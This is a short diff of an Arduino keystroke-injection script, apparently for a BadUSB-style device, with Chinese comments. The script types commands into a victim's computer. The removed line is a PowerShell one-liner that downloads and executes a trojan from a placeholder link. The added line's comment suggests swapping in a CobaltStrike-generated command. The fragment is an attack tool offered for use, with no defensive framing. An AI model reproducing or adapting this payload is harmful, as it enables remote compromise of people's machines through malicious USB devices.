@@ -21,7 +21,7 @@ Keyboard.press(KEY_RETURN);  //按下回车键执行
 delay(300);
 Keyboard.release(KEY_RETURN);  //松开回车键
 delay(300);
-Keyboard.println('powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('你的powershell木马下载链接')"');  //打开powershell并访问网址下载并执行木马
+Keyboard.println('');  //打开powershell并访问网址下载并执行木马，这里也可以用CobaltStrike生成的命令替代并分多次输入
 delay(300);
 Keyboard.press(KEY_RETURN);  //按下回车键
 delay(300);
